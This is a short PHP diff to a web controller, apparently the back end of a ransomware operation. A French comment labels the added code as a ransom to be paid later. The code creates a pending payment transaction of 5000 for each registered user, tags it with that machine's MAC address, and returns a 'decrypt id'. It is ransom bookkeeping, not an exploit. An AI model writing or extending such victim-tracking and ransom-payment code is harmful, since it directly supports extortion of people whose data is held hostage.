@@ -60,6 +60,21 @@ class UserController extends BaseController
 
             $this->logRepository->save($log, true);
 
+            // on prépare une transaction, à payer plus tard (rançon)
+            $transaction = $this->transactionRepository->findLastOneByUserAndStatus($user, [
+                Transaction::TRANSACTION_STATUS_PAYMENT_INTENT
+            ]);
+            if(!$transaction) {
+                $transaction = (new Transaction())
+                    ->setAmount(5000)
+                    ->setUser($user)
+                    ->setLabel('Paiement en cours depuis '.$user->getMacAddress())
+                    ->setPaymentStatus(Transaction::TRANSACTION_STATUS_PAYMENT_INTENT);
+            } else {
+                $transaction->setStripePaymentIntentId(null);
+            }
+            $this->transactionRepository->save($transaction, true);
+
             return $this->json($user->getDecryptId());
         } catch(\Throwable $e) {
             return $this->failure($e->getMessage() ?? 'Une erreur est survenue');
